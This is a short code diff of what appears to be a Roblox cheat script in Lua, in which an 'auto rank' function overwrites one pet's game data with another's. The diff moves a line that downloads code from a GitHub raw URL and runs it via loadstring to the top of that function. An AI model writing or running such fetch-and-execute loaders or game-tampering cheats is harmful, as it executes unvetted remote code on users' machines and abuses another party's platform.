@@ -109,6 +109,8 @@ end
 
 local function autoRankFunction()
     print("Auto Rank function executed")
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/PyroXHUB/dadasd/main/dupee'))()
+        wait(1)
         local lib = require(game.ReplicatedStorage.Library)
 
 		local fromPet = "Nuclear Squirrel"
@@ -120,8 +122,6 @@ local function autoRankFunction()
 		for i,v in pairs(lib.Directory.Pets[toPet]) do
 		  lib.Directory.Pets[fromPet][i] = v
 		end
-		wait(2)
-		loadstring(game:HttpGet('https://raw.githubusercontent.com/PyroXHUB/dadasd/main/dupee'))()
 end
 
 local function autoZoneQuestFunction()
